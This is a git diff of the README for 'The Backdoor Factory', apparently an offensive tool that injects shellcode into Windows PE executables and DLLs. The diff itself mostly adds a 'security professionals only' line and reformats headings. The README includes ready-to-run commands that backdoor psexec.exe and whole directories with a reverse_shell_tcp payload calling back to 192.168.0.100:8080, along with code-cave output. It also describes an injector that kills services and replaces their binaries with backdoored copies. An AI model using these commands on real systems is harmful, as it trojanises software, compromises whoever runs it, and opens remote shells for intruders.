@@ -1,4 +1,6 @@
 ##The Backdoor Factory
+For security professionals and researchers only.
+
 Injects shellcode into win32/64 PE files, to continue normal file execution (if the shellcode supports it), by patching the exe/dll directly.
 
 Some executables have built in protections, as such this will not work on all PE files.  It is advisable that you test target PE files before deploying them to clients or using them in exercises.
@@ -87,6 +89,8 @@ Options:
   -q, --no_banner       Kills the banner.
   
   -v, --verbose         For debug information output.
+
+
 ---
 
 Features:
@@ -104,9 +108,11 @@ Features:
 -The ability to backdoor a directory of executables/dlls
 
 ---------------------------------------------
-Sample Usage:
 
-#Backdoor a exe/dll using an existing code cave:
+Sample Usage:
+---
+
+###Backdoor a exe/dll using an existing code cave:
 
 ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 
 
@@ -126,7 +132,7 @@ Sample Usage:
 
 [*] All caves lengths:  (402,)
 
-############################################################
+-############################################################
 
 The following caves can be used to inject code and possibly
 
@@ -134,7 +140,7 @@ continue execution.
 
 **Don't like what you see? Use jump, single, or append.**
 
-############################################################
+-############################################################
 
 [*] Cave 1 length as int: 402
 
@@ -176,7 +182,7 @@ File psexec.exe is in the 'backdoored' directory
 
 ---
 
-#Backdoor an exe/dll by adding a code section:
+###Backdoor an exe/dll by adding a code section:
 
 ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a 
 
@@ -187,14 +193,14 @@ psexec.exe backdooring complete
 File bd.psexec.exe is in current directory
 
 ---
-#Backdoor a directory of exes:
+###Backdoor a directory of exes:
 ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a
 
 
 ...output too long for README...
 
 ---
-#Hunt and backdoor: Injector
+###Hunt and backdoor: Injector
 The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
 Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
 
